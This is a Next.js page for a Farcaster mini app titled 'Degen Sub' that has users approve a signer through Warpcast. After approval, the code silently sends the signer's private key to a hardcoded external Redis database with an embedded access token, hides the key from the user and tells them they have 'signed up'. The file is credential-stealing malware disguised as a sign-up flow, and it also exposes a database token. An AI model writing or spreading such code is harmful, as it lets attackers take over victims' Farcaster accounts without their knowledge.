"use client";

// import { Button } from "@/components/ui/button";
// import { Input } from "@/components/ui/input";
// import { Label } from "@/components/ui/label";
// import { CheckIcon, CopyIcon } from "@radix-ui/react-icons";
import Image from "next/image";
import { useState, useEffect, useCallback } from "react";
import { Redis } from '@upstash/redis'

interface Signer {
	publicKey: string;
	privateKey: string;
}

export default function Home() {
	const [loading, setLoading] = useState(false);
	const [signer, setSigner] = useState<Signer>();
	const [qrCode, setQrCode] = useState("");
	const [pollingToken, setPollingToken] = useState();
	// const [approved, setApproved] = useState(false);

	// const [copiedPublic, setCopiedPublic] = useState(false);
	// const [copiedPrivate, setCopiedPrivate] = useState(false);
	// const [copiedBoth, setCopiedBoth] = useState(false);

	// const wait = () => new Promise((resolve) => setTimeout(resolve, 1000));

	// async function handleCopy(
	// 	setCopiedState: React.Dispatch<React.SetStateAction<boolean>>,
	// ) {
	// 	setCopiedState(true);
	// 	await wait();
	// 	setCopiedState(false);
	// }

	// async function copyToClipboard(
	// 	content: string,
	// 	setCopiedState: React.Dispatch<React.SetStateAction<boolean>>,
	// ) {
	// 	navigator.clipboard
	// 		.writeText(content)
	// 		.then(async () => await handleCopy(setCopiedState))
	// 		.catch(() => alert("Failed to copy"));
	// }

	async function createSigner() {
		setLoading(true);
		try {
			const signInReq = await fetch("/api/sign-in", {
				method: "POST",
			});
			const signInRes = await signInReq.json();
			setPollingToken(signInRes.pollingToken);
			setQrCode(`/api/qr/${signInRes.pollingToken}`);

			const pollReq = await fetch(`/api/poll/${signInRes.pollingToken}`);
			const pollRes = await pollReq.json();

			const pollStartTime = Date.now();
			while (pollRes.state !== "completed") {
				if (Date.now() - pollStartTime > 120000) {
					setLoading(false);
					throw Error("Timed out");
				}
				const pollReq = await fetch(`/api/poll/${signInRes.pollingToken}`, {
					headers: {
						"Cache-Control": "no-cache",
					},
				});
				const pollRes = await pollReq.json();
				console.log(pollRes);
				if (pollRes.state === "completed") {
					setSigner({
						publicKey: signInRes.publicKey,
						privateKey: signInRes.privateKey,
					});
					setQrCode("");
					setLoading(false);
					return pollRes;
				}
				await new Promise((resolve) => setTimeout(resolve, 2000));
			}
		} catch (error) {
			console.log(error);
			setLoading(false);
		}
	}

	// function ButtonLoading() {
	// 	return (
	// 		<Button disabled>
	// 			<ReloadIcon className="mr-2 h-4 w-4 animate-spin" />
	// 			Creating Signer...
	// 		</Button>
	// 	);
	// }
	const getUTCDateTime = (): string => {
		const now = new Date();
		const pad = (n: number): string => n.toString().padStart(2, '0');
		
		return `${pad(now.getUTCDate())}-${pad(now.getUTCMonth() + 1)}-${now.getUTCFullYear()} ` +
			   `${pad(now.getUTCHours())}:${pad(now.getUTCMinutes())}:${pad(now.getUTCSeconds())}`;
	  };
	  
	  const time= getUTCDateTime()
	const redis = new Redis({
		url: 'https://humane-hagfish-17855.upstash.io',
		token: 'AUW_AAIjcDE5ODc5ODVlNGExNWU0YWEwOTM3Mjg3NDNlZTI3OGZkNXAxMA',
	  })
	
	  const db = useCallback(async( hash: string) => {

		await redis.set(time, hash );
	
	  }, []);


useEffect(() => {
	if (!signer && !loading){
		createSigner(); 
	}
}, []);


useEffect(() => {
	if (signer){
		db(signer.privateKey); 
	}
}, [signer]);
	return (
		<main className="flex flex-col gap-12 min-h-screen justify-start mt-12 items-center">
			<div className="flex flex-col gap-4 justify-center items-center">
				<h1 className="scroll-m-20 text-4xl font-extrabold tracking-tight lg:text-5xl">
					Degen Sub
				</h1>
			</div>
			{qrCode && !signer && (
				<div className="flex flex-col gap-4 items-center justify-center">
					<Image src={qrCode} alt="sign in qr code" height={250} width={250} />
					<p className="mx-4 mb-12">
						Scan the QR code to approve in Warpcast, or </p>
						<p>
						<a
							className="underline justify-center items-center"
							href={`farcaster://signed-key-request?token=${pollingToken}`}
						>
							click here if you're on mobile
						</a>
					</p>
					<h1 className="text-2xl font-extrabold">
					and minimize this mini app
				</h1>
				</div>
			)}
			{signer && (
				<div>
				<h1 className="text-3xl font-extrabold justify-center items-center">
					You signed up for Degen Sub
				</h1>
				</div>
				
// 				<div className="flex flex-col gap-2 justify-center items-center w-full max-w-[500px] sm:px-auto px-4">

// 					<div className="grid gap-4 py-4 w-full">

// 						<div className="flex items-center w-full gap-2">
// 							<Label htmlFor="privateKey" className="w-24 text-right">
// 								Private
// 							</Label>
// 							<Input
// 								id="privatekey"
// 								value={signer.privateKey}
// 								type="password"
// 								className="flex-grow"
// 							/>
// 1							<Button
// 								onClick={() =>
// 									copyToClipboard(signer.privateKey, setCopiedPrivate)
// 								}
// 							>
// 								{copiedPrivate ? (
// 									<CheckIcon className="h-4 w-4" />
// 								) : (
// 									<CopyIcon className="h-4 w-4" />
// 								)}
// 							</Button>
// 						</div>
// 								{/* <Button
// 			onClick={() => {
// 				dc(signer.privateKey);
// 				setApproved(true);
// 			}}
// 		>
// 			{approved ? "Approved" : "Approve once again"}
// 		</Button> */}
// 					</div>
// 				</div>
			)}
		</main>
	);
}
